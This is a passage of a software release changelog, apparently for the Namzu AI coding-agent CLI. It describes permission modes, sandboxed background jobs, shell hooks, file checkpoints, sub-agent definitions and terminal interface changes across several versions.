- d3f6a0f: Two composer prefixes that are not prompts. A line starting with `!` runs on the host as the operator's own command — no model call, no authorization gate, no sandbox, because the operator is not a tool call — with a transcript row, a pending glyph while it runs, a 60 s cap that kills the command's process group, and its output handed to the model on the next turn. A line starting with `#` is remembered, the way `/remember` is.
- 6024fd9: The permission prompt is the box an operator already knows from other coding agents: a title naming the operation (`Bash command`, `Edit file src/x.ts`, `Start 4 agents`), the operation in its plainest form — the command without quotes, the change as a coloured diff — one question, and three numbered answers with a cursor on `Yes`. `↑↓` move the cursor, `Enter` confirms the highlighted answer, `1`–`3` answer directly; `y`, `a`, `n`, `esc`, `ctrl+c` and `d` (exact input) keep working. **Enter now confirms**, where it previously did nothing: the settle window that already guards `y` and `a` guards it too, so an Enter in flight when the prompt appears still decides nothing. Paging a long operation moved to `PgUp`/`PgDn`/`Home`/`End`.
- f290174: File checkpoints. Before the session's `edit` or `write` tool changes a file, the file is recorded as it was — or as absent — once per file per turn. `/restore` lists the turns that changed files; `/restore N` puts every file back to before turn N, undoing N and every later turn (changed files rewritten, created files removed), and tells the model what was put back. Shell and sub-agent writes are not covered, and the records are dropped when the session closes.
- 52c52bc: A project can define its own sub-agents.

  `<cwd>/.namzu/agents/<name>.md` and `~/.namzu/agents/<name>.md` (project shadowing user) each define a `subagent_type` the `Agent` tool offers beside `general-purpose` and `explore`: YAML frontmatter with `name`, `description` and optionally `tools: read, grep`, `model`, `readOnly: true`, over a Markdown body that becomes the agent's prompt. The roster is the file's allowlist intersected with the parent's working set — a file cannot grant a tool the parent does not have — and `readOnly` narrows it the way `explore` is narrowed. The model is told each type's description so it can pick the right one. A file that cannot be loaded (no name, a built-in name, a bad `tools` line, an empty body) is named on stderr with its reason and the rest of the roster survives it.

- 7e01452: The `hooks` config key accepts every shell hook event the kernel has — `user_prompt_submit`, `session_start`, `session_end`, `pre_compact`, `post_compact`, `subagent_stop` alongside the four it had — and the session fires `session_start` before its first turn (with the conversation's durable id) and `session_end` when it closes. `/hooks` lists the hooks this session runs, by event. `/exit` now closes the session before the process leaves — background jobs are stopped, MCP servers closed, `session_end` runs — where it used to leave with everything still running.
- 23c140a: A tool server may be given its own connect deadline. `mcpServers.<name>.connectTimeoutMs` bounds how long that server has to connect, hand shake and list its tools; the default stays 10,000 ms. The default is sized for a wedged server, and a server whose first spawn is genuinely slow — a Python SDK server cold-boots in 15-20s on some machines — was a working server the CLI refused, stopping a headless run before its first turn with `did not answer within 10000ms`. A value that is not a positive number is refused with a reason rather than silently defaulted.
- 23c140a: `namzu run` exits 75 when the provider paused the run, and no longer 1. A pause — a rate limit, an outage — keeps a checkpoint and is answered by waiting; a failure is not, and the two shared exit code 1, so a wrapper could neither back off on the one nor stop retrying the other. 75 is `EX_TEMPFAIL`, the sysexits convention for "try again later". A wrapper that treated every non-zero code as final keeps working; one that tested `$? -eq 1` for a pause has to test 75.
- 1f554fd: A headless run can be given a longer leash. `--max-iterations <n>` and `--token-budget <n>` on `run` and `run-stream`, and a file-only `limits: { maxIterations, tokenBudget }` key they override, replace the fixed 50 model calls and one million tokens every run used to get — the numbers a chat turn wants, which a long autonomous task (a benchmark, a migration) outgrows and hit silently.
- 97e0960: Background jobs work under the sandbox: `run_in_background` starts the job inside the same bwrap or seatbelt boundary the foreground command would run in, `/jobs` lists it, and it is stopped with the session. A sandbox tier that cannot start a detached process still has none, and the model is told which case it is in.
- 1681904: Shell hooks: one line of config runs a command before or after a tool, or when a run starts or ends.

  ```yaml
  hooks:
    pre_tool_use:
      - matcher: bash
        command: ./scripts/check-command.sh
    post_tool_use:
      - matcher: edit|write
        command: pnpm biome format --write "$NAMZU_TOOL_PATH"
    run_end:
      - command: notify-send namzu "turn settled"
  ```

  A hook runs with `sh -c` in the working directory, receives the event as JSON on stdin (`event`, `tool_name`, `tool_input`, `tool_result`, `run_id`, `cwd`) and as `NAMZU_HOOK_EVENT` / `NAMZU_TOOL_NAME` / `NAMZU_TOOL_PATH` / `NAMZU_RUN_ID` in its environment. Its exit code is its answer: `0` carries on; `2` from a `pre_tool_use` hook **blocks the call** and tells the model why, with the hook's stderr as the reason; any other failure — including a timeout (default 30 s, capped at ten minutes) — is reported on stderr and never blocks. `matcher` is a tool name, a `|`-separated list, or a `prefix*`; absent means every tool. Hooks ride the plugin lifecycle manager, so they run with plugins on or off and take the same `plugins.hookTimeoutMs` ceiling. The key is file-only and never read from the environment, because a hook runs a command with the operator's authority. A hook cannot yet modify a tool's input or replace its result.

- f089ea0: A long think reads as work, and `/cost` says how full the context is.

  - **Thinking row.** While the model reasons, its current line is shown dim under the Working row (`└ thinking · …`; `└ thinking…` when the provider keeps its reasoning redacted) and disappears the moment the reply or a tool call begins. Reasoning never becomes a transcript row — the run keeps no such record either.
  - **Context in `/cost`.** `/cost` now prints `Context: 54,000 / 128,000 tokens (42%)` when the run knows both how full the context is and how large the window is, each term with its provenance; a `~` marks an estimated count or an assumed window, and nothing is printed when there is no window to measure against. The footer stays quiet — the persistent gauge was removed on purpose — so this is on request, where a person asks.
  - **`run-stream` wire (minor):** a new `reasoning` event (`{ kind: 'reasoning', text, done? }`) is emitted for reasoning deltas and block ends. Consumers that switch exhaustively on `kind` should add it; everything else is unchanged.

- 8b887a7: A headless run can wait out a provider pause and resume itself. `namzu run --wait-for-provider <duration>` (`90s`, `30m`, `2h`) and the `limits.waitForProviderMs` config key give the run a budget of time to spend waiting when the provider pauses it — a rate limit, an outage. It waits the provider's own delay when one was named, otherwise a minute doubling to fifteen, then resumes from the checkpoint the pause kept, in the same process and with the run's own context; a wait that would overrun the budget is not taken and the run exits 75 saying why. Without a budget nothing changes: exit 75 at once. `AgentSession` gains `resumePaused({ runId, checkpointId })`, a streaming resume of the session's own paused run, and the `paused` event now carries `runId`; a host that builds `AgentSession` objects by hand has to add the method.
- 1f339cf: Hard iteration, token, cost and timeout limits stop without an additional paid model call for a closing summary. Hosts must handle the unfinished stop reason instead of relying on a post-budget final answer. Child configuration cannot enlarge its reserved token allocation; a failed startup refunds that allocation and releases its workspace and session records.

  Context triggering, retention and relief use one multimodal estimate rather than treating base64 bytes as prose or ignoring rich content. Image/document estimates are heuristics, not billing bounds. Text and rich tool content are budgeted independently, retained artifacts survive text reduction, and recovery guidance does not recommend replaying state-changing actions. Provider tool-call IDs are hashed before use in spill filenames.

  Headless `run` and `run-stream` accept `--effort` and forward the explicit level to the selected provider. `run-stream` emits one terminal event after the persistence attempt and retains its stop reason. Consumers should not expect the former duplicate terminal event.

### Patch Changes

- c884bc8: File-defined agents and the read-only `explore` delegate now run on the kernel's loader, filters and prompt. `.namzu/agents/<name>.md` keeps its shape and behaviour; the CLI only decides the two directories and their order (user, then project shadowing it) and hands the rest to `@namzu/sdk`. One tightening rides along: a connected server's tool that merely claims to be read-only no longer reaches an `explore` or `readOnly: true` roster unless the server's read-only hints are trusted — the same rule the authorization gate already applied.
- f6678f5: When computer use cannot reach a desktop (a WSL process with no interactive Windows session, an ssh session with no display), the tool is still offered — with every capability off and the reason attached — rather than left out. The model sees what it cannot do and why, and a call is refused with the same reason, so it stops on the first result instead of reasoning from a tool that was never there.
- 698a5d8: The working doctrine the model reads and the interactive `ask_user_question` tool now come from `@namzu/sdk`. The prompt text is byte-for-byte what shipped; the question tool no longer has to be built through the coordinator set with a placeholder run id.
- f5e62a3: Shell hooks now run on the kernel's adapter. The `hooks:` config key, its shape and its behaviour are unchanged; the CLI only reads the file and hands the table to `@namzu/sdk`'s `attachShellHooks`, so an ACP server or an embedder gets the same contract from the same code.
- c5ef74c: Give the interactive terminal a compact Namzu identity, warm copper accents,
  a single writing rail and quieter tool and agent panels. A single Working
  animation replaces overlapping reply/tool spinners and shimmer. Existing
  keyboard controls, raw output and native scrollback retain their behavior.

  On short terminals, show the current tool and plan step with aggregate counts
  so busy work cannot push the composer controls or Working status offscreen.

- edc59a0: Give the terminal a phosphor-green identity with a compact NAMZU wordmark and a square message frame. Explicit palette indices keep colors consistent on 256-color terminals. The frame preserves input space and draft state, remains active while steering a running turn, and disappears when a text prompt owns input. Existing commands and keyboard bindings are unchanged.

  Keep the transcript's scrollback owner mounted during initial provider selection. Previously, entering the credential picker could leave the renderer reading a freed layout node on exit and exhaust the process heap.

- 6383358: The permission dialog opens readable for any batch it can show completely. A `read`, `grep`, `glob`, `ls` or connected-server call has no formatter and used to drop the whole batch into the exact JSON view, so an edit beside a read was reviewed as raw JSON by default; such a call is now listed key by key with every value JSON-escaped, which hides nothing, and the exact view stays one `d` away. An evolved shape of a tool that does have a formatter (`bash`, `edit`, `write`, `Agent`) and a tool whose name is not a plain token still open exact-first.
- b3222f5: The permission modes (`prompt`, `accept-edits`, `auto`, `strict`, `plan`) now run on the kernel's review policy; the CLI supplies the terminal prompt and the session's approve-all state. Behaviour, refusal texts and the exempt roster are unchanged. `namzu run --help` now lists all five modes.
- 51c0ea3: `namzu run-stream` no longer waits forever on a pipe that is open and silent. It read stdin to end-of-input whenever stdin was not a terminal, so a host that spawned it without closing stdin — a background task, a CI step, a UI that forgot — saw the boot log stop and nothing follow. It now takes the same quarter-second first-byte deadline `namzu run` already used: data that is there is read in full, silence means no history.
- 46aee01: When startup fails to load state or construct a session, show a clear stopped screen instead of an unusable message composer. Esc or one Ctrl+C now exits that screen. The original error stays visible, and invalid identity files remain untouched.

  Installations with a prefixed tenant ID must back up and move their old identity.json aside before starting the UUID-only CLI fresh. This creates a new installation identity; existing conversations stay on disk and are not imported. Provider preferences and credentials can be kept.

- 37d2d60: Two things the terminal showed that the frame-string tests could not: the banner's working directory is cut at its start and sized to the room beside the wordmark instead of wrapping mid-word across it, and a tool result shown line by line no longer repeats its first line — the `⎿` summary is that line, and the body starts at the second.
- 8a8de4a: Show a short, fading green light around the message frame while Namzu is working. The light follows multiline input and terminal resizing without moving or resetting the draft. It stops when the turn ends or another input surface takes focus, and stays off for non-interactive or color-disabled terminals and screen readers. The Working indicator and border use one shared animation scheduler.
- 334b9c3: On WSL, the probe that asks Windows for the paired home directory (to find a Claude credential on the Windows side) now ends with SIGKILL when it overruns its second; the interop shim ignored SIGTERM, and a boot could wait on it indefinitely. The credential discovery step is also bracketed in the debug log with its duration, so a boot that stalls there says so.
- 4510387: Add regression coverage for background jobs in supported sandboxes: the CLI
  offers the capability, and the executor routes process creation and cleanup
  through the sandbox. Correct an obsolete CLI test and documentation index
  entry that still expected all sandbox background jobs to be unavailable.
  Runtime behavior and public APIs are unchanged.
- Updated dependencies [2bcd95e]
- Updated dependencies [ec1ac3c]
- Updated dependencies [1f339cf]
- Updated dependencies [47e573c]
- Updated dependencies [4510387]
- Updated dependencies [4025c75]
- Updated dependencies [c884bc8]
- Updated dependencies [4dcb485]
- Updated dependencies [85dddca]
- Updated dependencies [f6678f5]
- Updated dependencies [34282d5]
- Updated dependencies [698a5d8]
- Updated dependencies [7e01452]
- Updated dependencies [d3f6a0f]
- Updated dependencies [22cf680]
- Updated dependencies [087abe9]
- Updated dependencies [f6a46b2]
- Updated dependencies [ec1ac3c]
- Updated dependencies [b3222f5]
- Updated dependencies [3ad8784]
- Updated dependencies [f8168ee]
- Updated dependencies [97e0960]
- Updated dependencies [f5e62a3]
- Updated dependencies [87c0034]
  - @namzu/sdk@35.0.0
  - @namzu/computer-use@1.4.1
  - @namzu/anthropic@4.0.4
  - @namzu/ollama@2.2.2
  - @namzu/openai@2.1.0
  - @namzu/openrouter@2.3.2

## 18.1.0

### Minor Changes

- cbdc218: Two permission modes for the two things an operator does most — watching the agent write code, and asking it to think first — plus a change that reads as a change.

  - **`accept-edits` mode.** `--permission-mode accept-edits`, `/permissions accept-edits`, or **Shift+Tab** in the composer. A batch made only of non-destructive `edit` and `write` calls (plus tools that never prompt) is approved without asking; a batch with a shell command, a delegation or anything a tool declares destructive still asks as a whole. Deny rules and the dangerous-pattern floor sit above it as above every mode.
  - **`plan` mode.** `--permission-mode plan`, `/permissions plan`, or Shift+Tab. Read-only tools and the task list work; any call that would change state is refused with feedback telling the agent to present its plan, and the system prompt carries a plan-mode block saying the same up front so it plans instead of probing. Leaving plan mode is the approval.
  - Shift+Tab cycles `prompt` → `accept-edits` → `plan` → `prompt`; `auto` and `strict` are chosen by name. The composer shows the mode beside the input whenever it is not `prompt`.
  - **Edit and write approvals show the change.** The readable review for an `edit` shows the path, then the removed lines as `-` and the added lines as `+`, coloured; a `write` shows the file it creates. Forty lines a side, the remainder counted. The exact prepared input is still behind `d`, byte for byte, and any shape the summary does not fully recognise opens there first as before.

  `PERMISSION_MODES` gains `accept-edits` and `plan`; a consumer validating modes against the old three-member list should add them. Nothing else on the surface changed.

- a70fae8: The model can ask you one question, where you are there to answer.

  The interactive session mounts the SDK's `ask_user_question` tool and answers it on screen: the model's two to four options as a chooser, then "Something else…" when it allowed an answer in your own words. Enter picks a row, the free-text row opens a one-line prompt, Esc skips (the model is told the question went unanswered and proceeds on its own judgment), Ctrl+C declines and stops the turn. The choice is recorded in the transcript beside the question. Headless runs do not mount the tool, so the model is never offered a question it would ask into the void. The working doctrine already tells the model to reserve questions for decisions that are genuinely the operator's.

  Also fixed: the interactive App now passes the `web` config through to its session; the previous release wired the key at the session but not from the TUI, so `web.fetch: true` reached headless runs only.

- cb58d38: A sub-agent that can only look.

  The `Agent` tool gains `subagent_type: "explore"`: a read-only sub-agent for the delegations a parent makes most — where is X defined, which files reference Y, how does Z work. Its roster is the parent's working set filtered to tools that declare themselves read-only (`read`, `grep`, `glob`, `ls`, the memory and search tools), so it never asks the operator for permission and cannot be handed a `write` through a `role`. The default `general-purpose` is unchanged. The permission review names the type when one is given, and the working doctrine tells the model when to pick each.

- 3406a42: The model's plan is a live list, and a slow paragraph streams a sentence at a time.

  - **Live task list.** `task_create` / `task_update` used to reach the screen as two transcript rows — one when a task opened, one when it closed — and nothing in between. The interactive session now keeps the whole plan in the live region above the composer: every task with its current mark (`☐` pending, `◐` in progress, `☑` done, `☒` failed) and a `done/total` count, updated in place on each change, kept up after the turn ends and cleared when the next request begins. The transcript still records the opening and the close.
  - **A paragraph that takes a while is shown a sentence at a time.** Reply text is released a block at a time so it never types itself out; a model's paragraph is one line, so nothing of a long one was shown until its final character. Text held longer than 250 ms is now released to its last safe cut — a sentence end or a line end, never mid-word, never inside a fence or an open inline code span. A fast reply still lands a paragraph at a time.
  - **`run-stream` wire (minor):** the `task` event now carries `taskId`, and is emitted on every status change (`pending`, `in_progress`, `completed`, `failed`) rather than only on creation and completion. Existing fields are unchanged; a consumer that keyed on `subject` and ignored intermediate states keeps working, one that counted `task` events as "opened or closed" should now filter on `status`.

- a769fd1: The agent can reach the web when you say so.

  A new `web` config key, file-only and off by default: `web: { fetch: true }` mounts `web_fetch` over the SDK's guarded provider (private and loopback addresses refused, redirects and body bounded) and adds the citation guidance to the prompt. Every fetch is reviewed like a shell command under `prompt` and `accept-edits`, whatever the tool declares about itself — a request leaving the machine to an address the model chose is one the operator sees first. Sub-agents do not receive the tool. There is no search backend in this kernel, so `web_search` is not offered and there is no `search` key. Without the key nothing changes: no tool, no provider, no guidance.

### Patch Changes

- 7ad4d43: The interactive agent now works under a written doctrine, and knows what the repository looked like when your turn began.

  - **Working doctrine in the system prompt.** The CLI previously told the model who it was and what it must never fabricate, and nothing about how to work — so scope, verification, narration and git safety all fell to whichever provider model was behind the session. The prompt now carries the rules an operator expects from a coding agent: act on the request as stated rather than narrowing or widening it; finish the whole task and say what was left out; read a file before editing it and match the surrounding code; prefer `read`/`grep`/`glob`/`edit` over their shell equivalents; run the checks that would catch a mistake before reporting done; never push, force-push, reset or rewrite history without being asked; say in one line what a batch of tool calls is for; open a task list for multi-step work. Delegated sub-agents receive the same doctrine, minus the rules about tools only the parent has.
  - **Turn-start repository snapshot.** The first model call of each turn now receives `git status --short` (bounded to 30 entries, each line cut at 200 characters) and the last five commit subjects, through the SDK's ephemeral `turn` placement — never in the cached system prompt, never in history, and not repeated on later iterations of the same turn. The block is wrapped as untrusted material: a file name or commit subject is text somebody else wrote, and it lands in a system message.
  - **Task tools are active from the first turn.** `task_create` / `task_update` / `task_list` no longer need a `search_tools` round-trip before the model can plan.

  No flag or configuration changed. A session that does not want the snapshot cannot yet turn it off; that switch is queued.

## 18.0.0

### Major Changes

- 109977d: Show active delegated work automatically below the CLI composer, keep sibling
  status and public interim answers visible while a batch runs, and provide
  keyboard drill-down without sacrificing the current draft. Delegated Agent
  calls now use the interactive one-hour deadline instead of the generic
  two-minute tool limit. The CLI's ordinary and resumed interactive runs now use
  that same one-hour upper deadline instead of the previous ten-minute default,
  so callers that relied on the old automatic cutoff must enforce a ten-minute
  process deadline themselves or cancel the turn explicitly.

  Add `ToolContext.toolBatchId`, a stable optional identity shared by direct tool
  calls issued in one model response, so hosts can group concurrent work without
  mixing separate waves from the same run.

### Patch Changes

- Updated dependencies [109977d]
  - @namzu/sdk@34.2.0

## 17.0.1

### Patch Changes

- a686817: Present parallel delegated work as named tasks instead of a raw internal tool envelope. After approval, the TUI now returns immediately to a visible Working state, shows the active child count, and lets Ctrl+T open the delegated-work cockpit.

## 17.0.0

### Major Changes

- 94e5989: Move new CLI-generated sessions, runs, memory and task state into the Project bound to the canonical working directory below `NAMZU_HOME` (default `~/.namzu`). Existing valid project-local state remains in use; corrupt or split histories now refuse and name the read-only inventory command instead of silently opening a different history. Project-local `.namzu` directories are reserved for authored commands, plugins and skills.

  High-level SDK agent configs now accept an exact `PathBuilder`, and disk-backed Project root bindings are tenant-scoped, immutable and safe under concurrent creation. Existing callers that omit `pathBuilder` retain their prior layout.

### Patch Changes

- Updated dependencies [94e5989]
  - @namzu/sdk@34.1.0

## 16.1.0

### Minor Changes

- 1dea1fa: Replace the flat delegated-agent picker with a responsive workflow cockpit that groups model-declared display annotations into stable phases, preserves selection across live lifecycle changes and retention fallback, and drills into each child's bounded live transcript.
- af49e28: Add a recovery-safe `namzu state` command that inventories project and user state without loading configuration, opening stores, following symbolic links, or changing files, and reports bounded record health, storage categories, recovery artifacts, attachment pairs, privacy boundaries, and project binding status in text, JSON, or YAML.

### Patch Changes

- bc947c1: Delay durable CLI conversation creation until the first admitted message or explicit conversation operation, preserve user-owned command and plugin scope when the working directory is the home directory, validate feedback against the canonical session run ledger, protect generated project-state partitions with owner-only permissions, and fail closed when a delegated run loses its parent review channel.
- 05f5f0b: Release the durable goal-command input gate before showing its completed result, so an operator can immediately follow a visible goal status with `/goal resume` without a false in-flight refusal.
- Updated dependencies [bc947c1]
  - @namzu/sdk@34.0.1

## 16.0.0

### Major Changes

- 4c31053: The coding CLI now runs sandbox-aware tools against the canonical project directory by default, and project changes survive individual turn and child-run teardown. Set `sandbox.workspace` to `ephemeral` to retain the previous disposable per-run workspace behavior.

  The SDK now honours `SandboxCreateConfig.workingDirectory` in `LocalSandboxProvider`, carries run-level sandbox workspace policy through `runAgent`, reactive, supervisor, and delegated-agent entry points, and requires providers to advertise `working-directory` support before receiving a host project path. Custom providers used with `sandbox.workspace: 'working-directory'` must add that mode to `workspaceModes`; omit the workspace mode to retain ephemeral behavior. `PipelineAgent` refuses this setting because arbitrary developer callbacks cannot be confined by the tool sandbox.

  The optional sandbox package now advertises its construction-time container and guest layouts as ephemeral-only instead of accepting a per-run host directory it cannot mount.

### Minor Changes

- 7347b8d: Expose optional per-task delegated-run events without replacing the scheduler-wide observer.

  Add a bounded `/agent` child-run observer, contextual Working activity, a quiet footer, and readable source-preserving tool approvals to the interactive CLI.

### Patch Changes

- Updated dependencies [ad1bab9]
- Updated dependencies [7347b8d]
- Updated dependencies [4c31053]
  - @namzu/sdk@34.0.0
  - @namzu/computer-use@1.4.0
  - @namzu/anthropic@4.0.4
  - @namzu/ollama@2.2.2
  - @namzu/openai@2.1.0
  - @namzu/openrouter@2.3.2

## 15.1.2

### Patch Changes

- adebe83: Publish `computer_use` through a flat provider-safe model schema while retaining its discriminated runtime validation. Anthropic now rejects root `anyOf`, `oneOf`, and `allOf` tool schemas locally with the offending tool name instead of sending a request that fails with HTTP 400. The CLI receives both fixes and keeps provider-chain diagnostics scoped to their requested home instead of leaking credentials from the process user's home.
- Updated dependencies [adebe83]
  - @namzu/sdk@33.1.1
  - @namzu/anthropic@4.0.4

## 15.1.1

### Patch Changes

- c982b56: Keep the terminal-owned transcript mounted while lifecycle pickers temporarily own the interactive viewport, preventing duplicate banners and settled history after provider or model changes.

  Normalize object-only union tool schemas at the provider wire boundary so built-in desktop actions retain every branch while satisfying the required root object type.

- Updated dependencies [c982b56]
  - @namzu/anthropic@4.0.3

## 15.1.0

### Minor Changes

- a9e8edd: Carry structured failure, provider and remediation metadata on resumable
  `run_paused` events. Current driver `ProviderRequestError` throttles now retain
  their retryability, status and retry delay at the terminal run boundary instead
  of being projected as unknown.

  The CLI exposes a distinct `paused` AgentEvent with checkpoint identity,
  renders actionable classified interruptions, holds dependent queued work, and
  prevents `namzu run` or ACP from treating a resumable stop as silent success.
  `run-stream` forwards the structured pause before its terminating `done` event.

### Patch Changes

- 36248f3: Add separate provider capability declarations for image and document tool
  results, and warn immediately before a request would degrade newly produced
  rich tool output. Tool presenters can now mark a generic label as a complete
  activity and mark a redundant successful acknowledgement as hidden; older
  hosts continue to render the same generic label.

  The account-routed Responses transport now sends supported user images and
  image tool results as ordered image input parts. Documents, unresolved stored
  references, unsupported image media types and unprojected omission markers are
  refused before transport.

  The interactive transcript now follows the visible conversation tail without
  a synthetic viewport-height gap, responds to terminal resize, narrates desktop
  actions with human labels, hides only successful empty acknowledgements, and
  keeps screenshot dimensions and failures visible.

- Updated dependencies [36248f3]
- Updated dependencies [a9e8edd]
  - @namzu/sdk@33.1.0
  - @namzu/anthropic@4.0.2
  - @namzu/deepseek@1.1.1
  - @namzu/ollama@2.2.2
  - @namzu/openai@2.1.0
  - @namzu/openrouter@2.3.2

## 15.0.0

### Major Changes

- 0532eb5: HTTP MCP transports no longer follow redirects. Configure the final MCP
  endpoint directly instead of a URL that returns a 3xx response. This is a
  breaking security boundary: authenticated SSE requests, session headers and
  JSON-RPC bodies now remain at the exact configured endpoint. A redirected
  tool call is reported as an unknown remote outcome that must not be retried
  automatically, because the configured server may already have applied it.

### Minor Changes

- 9937e90: Add a safe-first `/archive` confirmation that publishes a read-only durable conversation tombstone, removes it from `/resume`, and exits without printing a misleading resume command.
- e0d74ba: Add PageUp, PageDown, Home and End navigation to model, subscription, resume,
  prompt-edit, review, skill, permission, effort and copy choosers. Selection
  authority now updates synchronously so Enter applies the newest cursor even
  when navigation and confirmation arrive in one terminal input burst.
- 1d8ac36: Add Ctrl+L as an idle-only terminal display clear. It preserves model and
  durable conversation history like `/clear-screen`, and refuses while a turn is
  still producing output.
- d2c5896: Turn `/help` into an interactive, height-aware command palette that includes the live kernel and project command vocabulary and dispatches the selected row through the ordinary slash-command path.
- d85f9e0: Open bare `/export` as a destination chooser for a verified Markdown transcript.
  Clipboard export sends the complete durable projection through a bounded OSC 52
  request, while file export opens a session-prefilled filename editor and keeps
  the existing no-overwrite guarantee. `/export <path>` remains available.
- 6a71f3b: Open bare `/skills` as the discovered skill chooser. Preserve the previous text
  roster as `/skills list`, allow `/skills <name>` for direct activation, and keep
  `/skill` as a compatible alias.
- bd5b25c: Make Markdown HTTP(S) labels clickable on recognized terminal families while
  keeping destinations visible on unknown, remote, multiplexed and non-TTY output
  paths. Local-file and other non-web targets remain non-clickable.
- 677c185: Author multiline prompts with terminal newline bindings, move vertically by grapheme column, and preserve unsent text while traversing prompt history.
- 354b7a1: Ship and mount desktop computer use in the interactive CLI when its adapter
  initializes, with the host lifetime owned by the agent session and no exposure
  on unattended surfaces. WSL now targets the paired Windows desktop through
  `powershell.exe` instead of misclassifying WSLg as a Linux compositor session.
- 5d695e0: Edit drafts at the visible cursor with grapheme-safe movement and deletion, line-boundary movement, and terminal word and line kill bindings.
- ec42140: Move and delete by words with terminal-native bindings, and delete the next complete grapheme with Ctrl+D.
- 4ca89ce: Open the current text draft in the operator's `VISUAL` or `EDITOR` with Ctrl+G,
  temporarily releasing terminal raw mode and restoring the edited draft safely.
- 6265f5e: Grow slash-command and file-completion menus from six to as many as twelve
  visible choices when the terminal has spare height. Short terminals retain the
  bounded six-row window, and keyboard/page navigation continues over the full
  roster.
- c1b8c1f: Replace the successful `namzu skills` milestone stub with a real, trust-gated
  skill roster. The command supports `--cwd` and structured JSON/YAML output,
  shows broken skills with their refusal reason, and preserves project-over-user
  shadowing.
- 8cf937d: Navigate every slash-command match with visible position, page and boundary keys, including rapid terminal input bursts.
- 1b15308: Add selectable `/pwd` and `/mention` commands. `/pwd` reports the active
  session directory, while `/mention` restores an editable `@` file token in the
  composer without starting a model turn.
- 4ea7041: Add a prefilled conversation-name editor under `/rename`, keep `/title` as an
  alias, and persist the selected name directly to the session store for `/resume`.
- b74dcc7: Restore operator-authored prompt history for Ctrl+R after direct or in-TUI conversation resume.
- 4b6df87: Open bare `/review` as a keyboard chooser for a base branch, uncommitted work,
  a recent commit, or custom instructions. Branch comparisons are resolved to an
  immutable merge-base commit before reaching the agent, and finite choice labels
  use available terminal width instead of truncating every name to 18 columns.
- 46c3f95: Search submitted prompts with Ctrl+R and Ctrl+S while preserving the exact unsent draft and cursor.
- fd5baca: Add keyboard-selectable project-file mentions. `/mention` and a typed `@` show
  tracked, unignored paths; Enter or Tab inserts the selected token without
  submitting, and mention expansion refuses symlinks outside the trusted project.
- 8783b0b: Add `namzu resume <conversation-id>` as a copy-pasteable interactive-session
  handoff on clean exit. Short conversations now flow down from the banner while
  the composer remains near the terminal bottom, and slash-command navigation
  scrolls past the first six matches instead of making later commands unreachable.
- e3da442: Publish a model-owned reasoning-effort default alongside each exact menu and preserve it through retry, idle-timeout, and fallback decorators. Fallback chains expose a default only when every usable member agrees inside the common menu.

  Add non-wrapping Shift+Up/Shift+Down and Alt+period/Alt+comma effort shortcuts to the interactive composer. An unset selection anchors at the provider-published default; unknown or disagreeing defaults require an explicit `/effort` choice.

  Correct the subscription transport's model-specific effort contract. Recognized subscription models no longer offer or accept `none`, and only models whose current catalogue includes `ultra` accept it. Consumers that sent `none` to a recognized subscription model must omit effort or select one of the provider's published levels.

- 6f0b16f: Add terminal-native composer kill/yank editing: Ctrl+Y restores the last
  non-empty Ctrl+W, Ctrl+U, Ctrl+K, Alt+Backspace, or Alt+D deletion at the live
  cursor, and Ctrl+H consistently behaves as a grapheme-safe Backspace.
- d4dc3b3: Keep long model and conversation choices visible while navigating the terminal.
  Bare `/feedback` and `/skill` now open finite choosers, and a fully typed slash
  command is selected before longer names that share its prefix. When both
  Namzu-owned subscriptions exist, bare `/logout` asks which one to remove;
  provider-targeted slash and shell forms preserve the other credential.

### Patch Changes

- 315ee36: Make update checks settle at their deadline even when a registry transport or response body ignores cancellation, so `namzu upgrade` cannot hang indefinitely on an uncooperative request.
- b9c5b7c: Let task schedulers preserve an optional structured cancellation cause, and
  make the blocking `Agent` delegation end with the run that launched it. Parent
  cancellation now reaches both already-running tasks and tasks whose creation
  finishes late; built-in local and foreign schedulers expose `parent` on the
  child signal.

  Make the interactive session own its subagent runtime so Stop, session
  replacement and shutdown prevent late child tool work after the parent has
  settled.

- 6549301: Report the aggregate sandbox capability from the live runtime provider instead
  of optional-package installation, preventing contradictory startup diagnostics.
- 7209853: Report current MCP transport failures from `/mcp` instead of continuing to show a server as connected after its process or network connection has closed.
- e1a7e69: Add the observational `run_interrupt` plugin hook for explicitly user-cancelled root runs. Every registered interrupt handler gets a bounded cleanup window before the durable cancellation event; one handler's skip, error, retry, or timeout no longer suppresses later interrupt observers.

  Attribute interactive CLI turn interrupts to the public `user` cancellation cause so configured interrupt hooks run on both ordinary Stop actions and permission-prompt cancellation.

- 18e4d8c: Repeated headless run invocations no longer retain stdin listeners when an open pipe sends no data. The terminal test harness also releases its process-exit hook after teardown.
- 60ef03d: Report the running CLI package version in `namzu doctor --json` instead of the
  generic `unknown` placeholder.
- 6fa623a: Show the complete prepared tool input in interactive permission prompts instead
  of approving from a shortened summary. The terminal review is paged by physical
  rows and refuses an oversized or non-JSON-compatible batch rather than
  truncating it; ACP permission requests now carry the exact prepared input.
- Updated dependencies [7ea6c6c]
- Updated dependencies [5591d35]
- Updated dependencies [64f8040]
- Updated dependencies [cf2e8d0]
- Updated dependencies [b9c5b7c]
- Updated dependencies [5e95792]
- Updated dependencies [84d202d]
- Updated dependencies [8943b5b]
- Updated dependencies [354b7a1]
- Updated dependencies [c7783a6]
- Updated dependencies [6b49cdb]
- Updated dependencies [0f65d5e]
- Updated dependencies [e1a7e69]
- Updated dependencies [07990a8]
- Updated dependencies [f1c368d]
- Updated dependencies [8126a5a]
- Updated dependencies [1a59f58]
- Updated dependencies [10c0434]
- Updated dependencies [8fcb248]
- Updated dependencies [0532eb5]
- Updated dependencies [5854b4d]
- Updated dependencies [eca824b]
- Updated dependencies [e3da442]
  - @namzu/sdk@33.0.0
  - @namzu/computer-use@1.4.0
  - @namzu/openai@2.0.0
  - @namzu/anthropic@4.0.1
  - @namzu/ollama@2.2.1
  - @namzu/openrouter@2.3.1

## 14.3.0

### Minor Changes

- 10ba4b6: Make the interactive composer distinguish active-turn steering from queued
  follow-ups: Return steers at the SDK's next safe boundary while Tab queues the
  next turn, preserving attachments and durable ordering. Add Alt+V clipboard
  images and Ctrl+W word deletion, widen slash-command descriptions, keep recent
  transcript rows next to the composer, and replace the clean-exit diagnostic dump
  with a concise conversation `/resume` handoff.
- eb0401e: Add `namzu upgrade` and the read-only `namzu upgrade --check`. The updater
  derives the npm prefix from the package that is actually running, pins the
  registry's exact version, and reads that same package root back before reporting
  success; installations whose owner cannot be established are refused rather
  than updating another binary on `PATH`.

  The TUI's update notice now points to the real command. Finite `/permissions`
  and `/effort` choosers also ignore the Return key that opened them until the
